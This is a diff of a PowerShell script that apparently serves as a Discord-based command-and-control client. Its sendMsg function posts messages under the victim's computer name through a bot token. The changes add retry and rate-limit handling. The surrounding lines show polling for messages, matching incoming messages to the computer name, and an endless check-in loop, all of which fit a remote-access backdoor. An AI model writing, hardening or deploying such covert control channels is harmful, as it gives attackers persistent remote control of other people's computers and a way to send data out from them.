@@ -19,20 +19,40 @@ function PullMsg {
 function sendMsg {
     param([string]$Message)
     if (!$Message) { return }
-    # Экранируем обратные кавычки
     $Message = $Message -replace '`', "'"
     $uri = "https://discord.com/api/v9/channels/$chan/messages"
     $payload = @{
         "content" = $Message
         "username" = "$env:COMPUTERNAME"
     }
-    try {
-        Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body ($payload | ConvertTo-Json -Compress) | Out-Null
-        Write-Host "Message sent to Discord: $Message"
-    } catch {
-        Write-Warning "Failed sendMsg: $_"
+    $jsonBody = $payload | ConvertTo-Json -Compress
+    $maxRetries = 3
+    $retryCount = 0
+    while ($retryCount -lt $maxRetries) {
+        try {
+            Invoke-RestMethod -Uri $uri -Method Post -Headers @{Authorization="Bot $token"} -ContentType "application/json" -Body $jsonBody -TimeoutSec 10 | Out-Null
+            Write-Host "Message sent to Discord"
+            break
+        } catch {
+            $errorMessage = $_.Exception.Response.StatusCode.Value__ 2>&1
+            if ($errorMessage -eq 429 -or $_.Exception.Response.StatusCode.Value__ -eq 429) {
+                # rate limited
+                Write-Warning "Rate limited, retrying after delay..."
+                Start-Sleep -Seconds 2
+                $retryCount++
+            }
+            elseif ($_.Exception.Response.StatusCode.Value__ -eq 403) {
+                Write-Warning "Forbidden error (403), likely missing permissions."
+                break
+            }
+            else {
+                Write-Warning "Failed to send message: $_"
+                break
+            }
+        }
     }
 }
+
 
 Function Authenticate {
     if ($response -like "$env:COMPUTERNAME") {
@@ -103,4 +123,5 @@ while ($true) {
     }
     Start-Sleep -Seconds 5
 }
+
 
